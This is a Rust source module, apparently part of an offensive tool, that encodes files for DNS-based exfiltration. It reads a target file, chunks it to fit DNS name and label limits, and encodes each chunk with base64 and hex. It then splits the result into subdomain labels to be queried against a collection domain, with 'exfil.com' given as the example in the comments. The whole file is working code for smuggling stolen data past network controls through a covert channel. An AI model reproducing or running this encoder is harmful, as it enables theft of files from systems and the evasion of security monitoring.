//! DNS-based file exfiltration encoder.
//!
//! This module provides specialized encoding for DNS-based data exfiltration, handling the
//! unique constraints of DNS protocol: domain names cannot exceed 253 characters, and each
//! label (subdomain component) is limited to 63 characters.
//!
//! The DNS encoder strategically chunks data to fit within these constraints, allowing seamless
//! exfiltration across DNS queries. Each chunk is encoded with base64+hex and further segmented
//! into DNS-safe labels that can be transmitted as subdomain components.
//!
//! # DNS Constraints
//! - Maximum domain name length: 253 characters
//! - Maximum label length: 63 characters per subdomain component
//! - Maximum recommended payload: 4 MB (practical limit before single-byte queries)

use crate::nodes::{file_chunk::FileChunkNode, root::RootNode, Node};
use std::path::PathBuf;

use super::buffered_read_file;

const DOMAIN_NAME_MAX_LENGTH: usize = 253;
const DOMAIN_LABEL_MAX_LENGTH: usize = 63;

/// Maximum practical payload size for DNS exfiltration before efficiency degrades significantly.
///
/// At 4 MB, the average DNS query encodes approximately 1 byte of actual data due to
/// base64+hex encoding overhead, making exfiltration impractical. This constant enforces
/// a sanity check to prevent accidental misuse with extremely large files.
const MAX_LIMIT_PAYLOAD_SIZE: usize = 4 * (1024 * 1024); // 4 MB

/// Splits file data into chunks that safely fit within DNS protocol constraints.
///
/// Creates a hierarchical node structure suitable for DNS exfiltration:
/// 1. Root node containing filename and unique file identifier
/// 2. Sequential file chunk nodes, each sized to fit within domain name length limits
///
/// Each chunk is carefully sized to account for:
/// - The metadata overhead (node type, root ID, chunk index)
/// - The target domain name length
/// - Base64 and hex encoding expansion
/// - DNS label length restrictions (63 chars per label)
///
/// The function validates that the domain name + encoded chunk fits within the 253-character
/// maximum domain name length. The final chunk is automatically marked as an end-of-file marker.
///
/// # Arguments
/// * `root_node` - The root metadata node containing filename and file identifier.
/// * `domain_length` - The length of the target domain name (used for size calculations).
/// * `file_bytes` - The complete unencoded file data to be chunked.
///
/// # Returns
/// A vector of `Node` objects starting with a root node followed by file chunk nodes.
/// All nodes are ready for encoding and DNS transmission.
///
/// # Panics
/// - If the domain name is too long to encode any payload safely
/// - If the file size exceeds the 4 MB practical limit for DNS exfiltration
fn split_file_dns_safe(
    root_node: RootNode,
    domain_length: usize,
    file_bytes: Vec<u8>,
) -> Vec<Node> {
    let ref_root_identifier = std::rc::Rc::clone(&root_node.file_identifier);
    let decoded_length =
        (super::decoded_chunk_size(DOMAIN_LABEL_MAX_LENGTH) as f32 / 2.0).floor() as usize;

    if (domain_length + decoded_length) >= DOMAIN_NAME_MAX_LENGTH {
        panic!("Domain name too long to safely encode any payload chunks.");
    }

    if file_bytes.len() > MAX_LIMIT_PAYLOAD_SIZE {
        panic!("File size exceeds maximum limit for DNS exfiltration.");
    }

    let mut nodes: Vec<Node> = vec![Node::Root(root_node)];
    let mut payload_iterable = file_bytes.into_iter();
    let mut index: usize = 1;

    loop {
        let mut file_chunk_node = FileChunkNode::default()
            .set_index(index)
            .set_raw_root_node_id(std::rc::Rc::clone(&ref_root_identifier));

        let packet_metadata_length = format!(
            "{}:{}:{:X}:",
            file_chunk_node.node_type(),
            file_chunk_node.root_node_id,
            index
        )
        .len();

        let file_bytes_portion = payload_iterable
            .by_ref()
            .take(((decoded_length - packet_metadata_length) as f32 / 2.0).floor() as usize)
            .collect::<Vec<u8>>();

        if file_bytes_portion.is_empty() {
            break;
        }

        file_chunk_node.extend_data(file_bytes_portion);
        nodes.push(Node::FileChunk(file_chunk_node));
        index += 1;
    }

    println!("Total chunks created: {}", index - 1);

    nodes.last_mut().map(|last_node| {
        if let Node::FileChunk(chunk_node) = last_node {
            chunk_node.set_last_chunk();
        }
    });

    nodes
}

/// Encodes a complete file for DNS exfiltration with multi-stage encoding and segmentation.
///
/// This is the primary entry point for DNS-based file exfiltration. The function performs
/// a complete encoding pipeline optimized for DNS protocol constraints:
///
/// 1. **File Reading**: Loads the complete target file into memory
/// 2. **Root Node Creation**: Generates a unique 4-byte file identifier and wraps filename
/// 3. **DNS-Safe Chunking**: Splits the file into chunks that fit within domain name length limits
/// 4. **Node Encoding**: Encodes each node (root + file chunks) with base64+hex for transmission safety
/// 5. **Label Segmentation**: Further splits encoded data into 31-character DNS labels (ensuring
///    each fits in the 63-character DNS label limit after domain name accounting)
///
/// The resulting vector contains DNS query payloads where each element represents the subdomain
/// portion of a DNS query that would be sent to the target domain. For example, if the domain
/// is "exfil.com", a payload "aabbccdd.eeffgghh.iijjkkll" would be queried as
/// "aabbccdd.eeffgghh.iijjkkll.exfil.com".
///
/// # Arguments
/// * `filepath` - Path to the target file to exfiltrate from the filesystem.
/// * `domain_name` - The target domain name for exfiltration. Must be short enough to allow
///   space for encoded chunk data. The function accounts for this length when chunking.
///
/// # Returns
/// A vector of subdomain strings, each representing one DNS query's data payload. Each string
/// contains dot-separated DNS labels, ready to be prefixed to the domain name for querying.
///
/// # Panics
/// - If the file cannot be read from the filesystem
/// - If the domain name is too long to encode any payload data
/// - If the file exceeds the 4 MB practical size limit for DNS exfiltration
///
/// # Example
/// If a 100-byte file is encoded, the result might be a vector like:
/// `["aabbcc.ddeeff.gghh", "iijjkk.llmmnn.oopq"]` which would be queried as:
/// `aabbcc.ddeeff.gghh.exfil.com` and `iijjkk.llmmnn.oopq.exfil.com`
pub fn encode_payload_dns_safe(filepath: &PathBuf, domain_name: &str) -> Vec<String> {
    let file_bytes = buffered_read_file(filepath);
    let root_node = RootNode::try_from(filepath).unwrap();
    let nodes = split_file_dns_safe(root_node, domain_name.len(), file_bytes);
    let chunk_size = (DOMAIN_LABEL_MAX_LENGTH / 2) as usize;

    nodes
        .iter()
        .map(|node| {
            crate::encoders::encode_b64_hex(node.to_string())
                .as_bytes()
                .chunks(chunk_size)
                .filter_map(|byte| std::str::from_utf8(byte).ok())
                .collect::<Vec<&str>>()
                .join(".")
        })
        .collect()
}
